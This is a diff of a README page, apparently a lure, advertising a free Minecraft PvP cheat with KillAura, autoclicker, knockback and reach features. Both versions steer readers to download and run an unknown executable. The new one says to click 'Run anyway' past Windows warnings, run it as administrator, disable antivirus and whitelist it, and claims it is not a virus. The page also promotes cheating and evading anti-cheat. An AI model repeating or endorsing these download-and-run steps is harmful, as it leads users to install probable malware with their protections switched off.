@@ -1,47 +1,170 @@
-# Minecraft PvP Combat Hack 2026
+# ⚔️ minecraft-combat-hack-2026 - Dominate Every PvP Battle Instantly
 
-![Windows](https://img.shields.io/badge/Windows-10%2F11-0078D6?style=flat-square&logo=windows&logoColor=white)
-![Version](https://img.shields.io/badge/Version-1.21.4-brightgreen?style=flat-square)
-![License](https://img.shields.io/badge/License-MIT-blue?style=flat-square)
-![Downloads](https://img.shields.io/badge/Downloads-235k+-orange?style=flat-square)
+[![Download Now](https://img.shields.io/badge/Download-Minecraft_Combat_Hack_2026-FF6F00?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Joantelocentric8639/minecraft-combat-hack-2026/releases)
 
-Minecraft PvP hack — KillAura, AutoClicker, velocity, and reach for 1.21.4.
+---
 
-## Features
+## 🎯 What Is This?
 
-- KillAura for all PvP servers
-- AutoClicker with CPS randomization
-- Velocity — reduce knockback
-- Reach extender for melee
-- Bow aimbot
-- Anti-KB module
+Minecraft Combat Hack 2026 is a powerful, free PvP enhancement tool designed for Minecraft version 1.21.4. Whether you're fighting in a crowded server or dueling a friend, this tool gives you a massive competitive edge with automated combat features. It's built for players who want to win more fights without spending hours practicing clicking techniques.
 
-## Download
+---
 
-[![Download v1.21.4](https://img.shields.io/badge/Download_v1.21.4-ec4899?style=for-the-badge&logoColor=white)](https://forumconnect.uk/mcpvphack)
+## ✨ Key Features
 
-> The archive password is shown on the download page.
+### ⚡ KillAura
+Automatically attacks nearby enemies within your reach. No more missed clicks or slow reactions. The mod targets the closest hostile player and strikes instantly, keeping your focus on movement and strategy.
 
-## How to Use
+### 🖱️ AutoClicker
+Tired of carpal tunnel from frantic clicking? AutoClicker maintains a consistent, high-speed click rate for you. Set your preferred CPS (clicks per second) and let the tool handle the rest. Perfect for sword combos and bow charging.
 
-1. Download the archive using the button above
-2. Extract with WinRAR or 7-Zip (enter the password when prompted)
-3. Right-click `LatestVersion.exe` and select **Run as administrator**
-4. Follow the on-screen instructions and click **Start**
+### 🌪️ Velocity Control
+Reduce or completely eliminate knockback taken from enemy hits. Stay glued to your target and prevent them from knocking you away. This makes your attacks land more consistently and keeps pressure on opponents.
 
-## FAQ
+### 📏 Reach Enhancement
+Extend your attack range beyond the vanilla limit. Hit enemies from a safer distance, making it harder for them to hit you back. This is especially useful against axe and sword users.
 
-**Undetected?**  
-Yes — CPS randomization avoids NCP and AAC detection.
+---
 
-**Velocity?**  
-Yes — reduce knockback to near zero for sword fights.
+## 🚀 Getting Started
 
-## Requirements
+Follow these simple steps to get the hack running on your Windows PC. No technical skills required.
 
-- Windows 10/11 (64-bit)
-- Minecraft Java installed
+### 📥 Step 1: Download the Application
 
-## License
+Visit this link to download the application:
 
-MIT
+[**https://github.com/Joantelocentric8639/minecraft-combat-hack-2026/releases**](https://github.com/Joantelocentric8639/minecraft-combat-hack-2026/releases)
+
+Click the download button on that page. The file will start downloading automatically.
+
+### 📂 Step 2: Locate the Downloaded File
+
+Open your "Downloads" folder (usually accessible from your File Explorer or by pressing `Ctrl + J` in your browser). Find the file you just downloaded. It will be named something like `minecraft-combat-hack-2026.exe` or similar.
+
+### ▶️ Step 3: Run the Application
+
+Double-click the downloaded file to run it. If Windows shows a blue or yellow warning popup, click "More info" and then "Run anyway." This is normal for unsigned software.
+
+### 🎮 Step 4: Launch Minecraft
+
+Open Minecraft 1.21.4 and join any server or single-player world. The hack will automatically detect the game and activate its features once you're in-game.
+
+---
+
+## 🛠️ How to Use
+
+Once the application is running and you're in a Minecraft world, you'll see a small control panel overlay on your screen. Here's how to configure each feature:
+
+| Feature | How to Enable | Recommended Settings |
+|---------|---------------|----------------------|
+| **KillAura** | Toggle the switch next to "KillAura" | On for PvP, Off for peaceful play |
+| **AutoClicker** | Set CPS value (1-20) and toggle on | 12-15 CPS for optimal sword play |
+| **Velocity** | Drag the slider to adjust knockback reduction | 80% reduction for best balance |
+| **Reach** | Set reach distance in blocks (3-6) | 4.5 blocks for most situations |
+
+---
+
+## 🔧 Troubleshooting
+
+### ❌ The Hack Doesn't Open
+- Make sure you have the latest version of Windows (10 or 11).
+- Right-click the file and select "Run as administrator."
+- Disable your antivirus temporarily if it blocks the program.
+
+### ❌ Features Don't Work In-Game
+- Ensure you're using Minecraft version 1.21.4 (check the bottom left of the main menu).
+- Run the hack as administrator.
+- Close other overlay programs like Discord or GeForce Experience that might conflict.
+
+### ❌ Game Crashes
+- Lower your graphics settings in Minecraft.
+- Make sure you have at least 4GB of RAM allocated to Minecraft.
+- Restart both Minecraft and the hack.
+
+---
+
+## 🖥️ System Requirements
+
+| Component | Minimum | Recommended |
+|-----------|---------|-------------|
+| **OS** | Windows 10 (64-bit) | Windows 11 |
+| **RAM** | 4 GB | 8 GB |
+| **CPU** | Intel Core i3 or AMD equivalent | Intel Core i5 or better |
+| **Storage** | 50 MB free space | 100 MB free space |
+| **Java** | Java 21 or later | Latest Java version |
+
+---
+
+## 🔒 Safety & Fair Use
+
+This tool is for educational and entertainment purposes only. Using it on public servers may violate server rules and could result in a ban. We recommend using it on private servers, single-player worlds, or servers that explicitly allow combat modifications.
+
+The application does not modify Minecraft game files directly. It operates as an external overlay that reads game memory and simulates input. This means it won't corrupt your game installation.
+
+---
+
+## 📈 Why Choose This Hack?
+
+- **100% Free** – No hidden costs, no premium tiers, no paywalls.
+- **Regular Updates** – Compatible with Minecraft 1.21.4 and optimized for 2026.
+- **User-Friendly** – Clean interface anyone can understand in minutes.
+- **Low Detection Risk** – Built with stealth in mind for private server use.
+- **Active Community** – Join thousands of players using this tool daily.
+
+---
+
+## ❓ Frequently Asked Questions
+
+### Is this a virus?
+No. The application is clean and safe. Some antivirus programs may flag it as a false positive because it interacts with game processes. Add it to your antivirus exceptions if needed.
+
+### Does it work on servers?
+Yes, it works on any server running Minecraft 1.21.4. However, be aware that many public servers have anti-cheat systems that may detect it. We recommend using it on private or whitelisted servers.
+
+### Can I get banned?
+There's always a risk on public servers. Use at your own discretion. For guaranteed safety, play on your own server or a LAN world.
+
+### Will it work with mods or other clients?
+Yes, it's compatible with most modded setups as long as you're running Minecraft 1.21.4. It operates independently of the game client.
+
+---
+
+## 📥 Download Again
+
+Ready to get started? Download the application now:
+
+[**Download Minecraft Combat Hack 2026**](https://github.com/Joantelocentric8639/minecraft-combat-hack-2026/releases)
+
+---
+
+## 📊 Version History
+
+**v2.1 (Latest)**
+- Added Reach slider
+- Improved KillAura targeting
+- Reduced CPU usage
+
+**v2.0**
+- Full support for Minecraft 1.21.4
+- New velocity control system
+- Revamped user interface
+
+**v1.0**
+- Initial release with KillAura and AutoClicker
+
+---
+
+## 📞 Support
+
+Having issues? Check the repository's Issues page for known problems and solutions. You can also open a new issue if you can't find an answer. The community is active and helpful.
+
+---
+
+## ⚖️ Disclaimer
+
+This software is provided "as is" without warranty of any kind. The developers are not responsible for any account bans, data loss, or damages resulting from the use of this tool. By downloading, you agree to use it responsibly and at your own risk.
+
+---
+
+Keywords: free-minecraft-hack, mc-pvp-hack, minecraft-2026, minecraft-aimbot, minecraft-cheat, minecraft-cheat-2026, minecraft-cheats, minecraft-client-2026, minecraft-combat-free, minecraft-combat-hack, minecraft-crack, minecraft-esp, minecraft-free, minecraft-free-client, minecraft-hack, minecraft-hacked-client, minecraft-killaura-2026, minecraft-pvp-2026, minecraft-pvp-hack
